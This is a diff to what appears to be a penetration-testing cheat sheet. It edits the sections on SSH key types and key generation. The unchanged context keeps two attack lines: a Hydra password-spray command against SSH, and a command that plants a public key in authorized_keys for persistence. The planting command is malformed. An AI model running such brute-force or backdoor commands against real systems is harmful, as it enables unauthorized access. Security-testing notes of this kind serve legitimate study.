@@ -954,30 +954,15 @@ get file.txt -
 +---------- Spray Service ----------+
 (hydra -I ssh://$TARGET -L usernames -P passwords -e n -t15 2>/dev/null &)
 
-+---------- View Key Types ----------+
++---------- View Types ----------+
 ssh -Q key
 
-+---------- List of Key Types ----------+
-ssh-ed25519
-ssh-rsa
-ssh-dss
-ssh-ed25519-cert-v01@openssh.com
-ssh-rsa-cert-v01@openssh.com
-ssh-dss-cert-v01@openssh.com
-ecdsa-sha2-nistp256
-ecdsa-sha2-nistp384
-ecdsa-sha2-nistp521
-ecdsa-sha2-nistp256-cert-v01@openssh.com
-ecdsa-sha2-nistp384-cert-v01@openssh.com
-ecdsa-sha2-nistp521-cert-v01@openssh.com
-
-+---------- Remove Existing Keys ----------+
++---------- Remove Keys ----------+
 ssh-add -D
 
-+---------- Create New Key Pairs ----------+
-ssh-keygen -t ed25519 -f id_ed25519 -N ''; chmod 600 id_ed25519 id_ed25519.pub; cat id_ed25519.pub
-ssh-keygen -t rsa -f id_rsa -N ''; chmod 600 id_rsa id_rsa.pub; cat id_rsa.pub
-ssh-keygen -t dsa -f id_dsa -N ''; chmod 600 id_dsa id_dsa.pub; cat id_dsa.pub
++---------- Create Keys ----------+
+ssh-keygen -t ed25519 -f ssh -N ''; mv ssh ~/.ssh/ssh.key; chmod 600 ~/.ssh/ssh.key; cat ssh.pub | awk '{print $1 " " $2}' > /Upload/ssh.pub
+ssh-keygen -t rsa -f ssh -N ''; mv ssh ~/.ssh/ssh.key; chmod 600 ~/.ssh/ssh.key; cat ssh.pub | awk '{print $1 " " $2}' > /Upload/ssh.pub
 
 +---------- Add Public Key to Authorized Keys ----------+
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDAS3I0GV78pbzK7Kd3m44tFBbqX1sXRpCv6LPjle3yW root@hostname' > TARGET > ~/.ssh/authorized_keys
